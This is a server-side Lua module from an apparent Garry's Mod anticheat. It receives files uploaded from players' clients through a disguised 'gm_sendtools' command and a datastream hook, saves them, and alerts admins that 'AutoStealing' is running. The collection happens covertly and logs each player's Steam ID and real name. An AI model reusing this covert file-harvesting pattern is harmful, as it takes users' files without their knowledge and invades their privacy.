
local IncomingID = "15"

function TellHeX(ShortMSG,typ,snd)
	if not ShortMSG then return end
	for k,v in ipairs(player.GetAll()) do
		if v:IsValid() and v:IsAdmin() and v:IsHeX() then
			HACGANPLY(v, ShortMSG, typ or NOTIFY_CLEANUP, 10, snd)
		end
	end
end
function Print2HeX(str)
	if not str then return end
	Msg(str)
	for k,v in pairs(player.GetAll()) do 
		if v:IsValid() and v:IsAdmin() and v:IsHeX() then
			v:PrintMessage(HUD_PRINTCONSOLE, str)
		end
	end
end

function HAC.GimmeLog(ply,cmd,args)
	if not ply:IsValid() then return end
	
	if not ply.HACStealStarted then
		ply.HACStealStarted = true
		
		TellHeX( Format("AutoStealing started on %s, DO NOT kick/ban!", ply:Nick()) , NOTIFY_UNDO, "npc/roller/mine/rmine_blip1.wav")
		Print2HeX( Format("\n[HAC%s] - AutoStealing started on %s (%s)\n\n", HAC.Version, ply:Nick(), ply:SteamID()) )
	end
	
	local SID		= ply:SID():lower()
	local SUP		= ply:SID():upper()
	local NewFile	= args[1] or "-args1-Fuckup-"
	local NewSize	= args[2] or "-args2-Fuckup-"
	local LogName	= Format("HAC-%s/%s.txt", SUP, SID)
	local Filename	= Format("HAC-%s/%s-%s.txt", SUP, NewFile:gsub(".lua",""), NewSize)
	
	if (NewFile == "-args1-Fuckup-" and NewSize == "-args2-Fuckup-") then
		return
	end
	
	if not file.Exists(Filename) then
		TellHeX( Format("AutoStealing %s from %s, DO NOT kick/ban!", NewFile, ply:Nick()) , NOTIFY_GENERIC, "npc/roller/mine/rmine_blip1.wav")
		Print2HeX( Format("[HAC%s] - AutoStealing %s from %s (%s)\n", HAC.Version, NewFile, ply:Nick(), ply:SteamID()) )
		
		if not file.Exists(LogName) then
			file.Write(LogName, Format("[HAC%s] / (GMod U%s) AutoStealer log created at [%s]\nFor: %s <%s> (%s)\n\n", HAC.Version, VERSION, Date(), ply:Nick(), ply:GetRealName(), ply:SteamID() ) )
		end
		filex.Append(LogName, Format('\t"%s-%s",\n', NewFile, NewSize) )
	end
end
concommand.Add("gm_sendtools", HAC.GimmeLog)


function HAC.GimmeRX(ply,han,id,enc,dec)
	local TXTab = dec[1]
	if (TXTab and type(TXTab) == "table" and TXTab.TXOk) then
		local TXTook = TXTab.TXTook or 0
		local TXOk	 = TXTab.TXOk	or false
		
		ply.TXOk = true
		
		if HAC.Debug then
			print("! Got TX reply: ", ply, TXTook)
		end
		return
	end
	
	local SID			= ply:SID():lower()
	local SUP			= ply:SID():upper()
	local LogName		= Format("HAC-%s/%s.txt", SUP, SID)
	local num			= 0
	local DoneAlready	= false
	
	for k,v in pairs(dec) do
		if type(v) != "table" then
			HAC.LogAndKickFailedInit(ply,"GimmeRX_BAD_"..string.upper(type(v)),"Don't mess with that!")
			break
		end
		
		local LuaName	= tostring(v.Name or num):gsub(".lua","")
		local Size		= v.Size or 0
		local Cont		= v.Cont or "Cont-fuckup"
		local Filename	= Format("HAC-%s/%s-%s.txt", SUP, LuaName, Size)
		
		if file.Exists(Filename) then
			DoneAlready = true
		else
			num = num + 1
			file.Write(Filename, Cont)
		end
	end
	
	if (num > 0) then
		TellHeX( Format("AutoStealing %s of %s's files complete!", num, ply:Nick()) , NOTIFY_ERROR, "npc/roller/mine/rmine_taunt1.wav") 
		Print2HeX( Format("\n[HAC%s] - AutoStealing %s of %s's files complete!\n\n", HAC.Version, num, ply:Nick()) )
		
		if file.Exists(LogName) then
			filex.Append(LogName, Format("\n%s files recieved @ [%s]\n\n\n", num, Date()) )
		end
	elseif (num <= 0) and (not DoneAlready) then
		TellHeX( Format("Booty table sent by %s was empty!", ply:Nick()) , NOTIFY_ERROR, "npc/roller/mine/rmine_taunt1.wav")
		Print2HeX( Format("\n[HAC%s] - Booty table sent by %s was empty!\n\n", HAC.Version, ply:Nick()) )
	end
end
datastream.Hook(IncomingID, HAC.GimmeRX)



